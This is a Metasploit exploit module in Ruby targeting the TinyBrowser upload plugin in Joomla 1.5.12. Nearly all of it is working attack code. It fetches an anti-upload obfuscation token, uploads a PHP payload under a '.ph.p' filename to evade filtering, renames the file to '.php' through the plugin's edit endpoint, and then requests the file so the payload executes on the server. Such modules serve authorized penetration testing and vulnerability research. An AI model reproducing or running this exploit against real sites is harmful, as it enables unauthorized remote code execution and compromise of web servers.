##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Joomla 1.5.12 TinyBrowser File Upload Code Execution',
			'Description'    => %q{
				This module exploits a vulnerability in the TinyMCE/tinybrowser plugin.
				This plugin is not secured in version 1.5.12 of joomla and allows the upload
				of files on the remote server. 
				By renaming the uploaded file this vulnerability can be used to upload/execute
				code on the affected system.
			},
			'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['URL', 'http://milw0rm.com/exploits/9296'],
					['URL', 'http://developer.joomla.org/security/news/301-20090722-core-file-upload.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      => 
						{
							'ConnectionType' => 'find',
						},
					'Space'       => 1024,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'July 22 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('URI', [true, "Joomla directory path", "/"]),
				], self.class)
	end

	def check
		res = send_request_raw({
			'uri'     => datastore['URI'] + '/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder='
		}, 25)

		if (res and res.body =~ /flexupload.swf/)
			
			return Exploit::CheckCode::Vulnerable
	
		end

		return Exploit::CheckCode::Safe
	end


	def retrieve_obfuscation()

	end


	def exploit

		cmd_php = '<?php ' + payload.encoded + '?>'
		
		# Generate some random strings
		cmdscript	= rand_text_alpha_lower(20) 
		boundary = rand_text_alphanumeric(6)

		# Static files
		directory 	= '/images/stories/'
		tinybrowserpath = '/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/'
		cmdpath 	= directory + cmdscript 

		# Get obfuscation code (needed to upload files)
		obfuscation_code = nil
		res = send_request_raw({
			'uri'     => datastore['URI'] + tinybrowserpath + '/upload.php?type=file&folder='
		}, 25)

		if (res)
			
			if(res.body =~ /"obfus", "((\w)+)"\)/)
				obfuscation_code = $1
				print_status("Successfully retrieved obfuscation code: #{obfuscation_code}")
			else
				print_error("Error retrieving obfuscation code!")
				return
			end
		end
		
		

		# Upload shellcode (file ending .ph.p)
		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
		data << "#{cmdscript}.ph.p\r\n--#{boundary}"
		data << "\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"#{cmdscript}.ph.p\"\r\n"
		data << "Content-Type: application/octet-stream\r\n\r\n"
		data << cmd_php
		data << "\r\n--#{boundary}--"

		res = send_request_raw({																													
			'uri'	  => datastore['URI'] + tinybrowserpath + "/upload_file.php?folder=/images/stories/&type=file&feid=&obfuscate=#{obfuscation_code}&sessidpass=",
			'method'  => 'POST',
			'data'    => data,
			'headers' =>
			{
				'Content-Length' => data.length,
				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary,
			}
		}, 25)

		if (res and res.body =~ /File Upload Success/)
			print_status("Successfully uploaded #{cmdscript}.ph.p")
		else
			print_error("Error uploading #{cmdscript}.ph.p")
		end
		
		
		# Complete the upload process (rename file)
		print_status("Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p")		
		res = send_request_raw({
			'uri'     => datastore['URI'] + tinybrowserpath + 'upload_process.php?folder=/images/stories/&type=file&feid=&filetotal=1'
		})
		
		
		# Rename the file from .ph.p to .php
		res = send_request_cgi({
                        'method'    => 'POST',
                        'uri'       => datastore['URI'] + tinybrowserpath + '/edit.php?type=file&folder=',        
                        'vars_post' => 
                        {
                                'actionfile[0]' => "#{cmdscript}.ph.p",
				'renameext[0]'   => 'p',
				'renamefile[0]' => "#{cmdscript}.ph",
				'sortby' => 'name',
				'sorttype' => 'asc',
				'showpage' => '0',
				'action' => 'rename',
				'commit' => '',
				
                        }
                }, 10)
		
		if (res and res.body =~ /successfully renamed./) 
			print_status ("Renamed #{cmdscript}.ph.p to #{cmdscript}.php")
		else
			print_error("Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php")
		end
		
		
		# Finally call the payload
		print_status("Calling payload: #{cmdscript}.php")
		res = send_request_raw({
			'uri'	=> "#{datastore['URI'] }images/stories/#{cmdscript}.php"
		}, 25)
		

	end
end
